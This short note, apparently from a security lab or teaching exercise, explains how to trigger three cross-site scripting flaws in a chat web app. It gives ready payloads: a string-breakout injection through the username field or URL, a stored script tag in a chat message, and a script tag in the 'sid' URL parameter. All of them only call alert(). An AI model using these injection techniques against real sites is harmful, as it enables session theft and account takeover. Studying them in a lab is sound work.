TO EXECUTE THE 3 TYPES OF XSS ATTACKS:



1 ():
    Insert in the username field something (nothing also works) with "; at the end, then insert your javascript <script> SOME JAVASCRIPT </script> to execute, then send the form.
    Example:
        james";<script>alert("XSS attack type 1")</script>
    
    you can also encode the username in the URL:

        http://hostname/chat?username=James22%22;alert("XSS attack type 1");a=%22&sid=231231

2:
    Once you logged in, send a message in the chat that contains javascript tags with javascript in between, then reload the page.
    Example:
        <script>alert("XSS attack type 2")</script>

3:
    Change the sid in the URL to some javascript between javascript tags.
    Example:
        http://hostname/chat?username=James22&sid=<script>alert("XSS attack type 3")</script>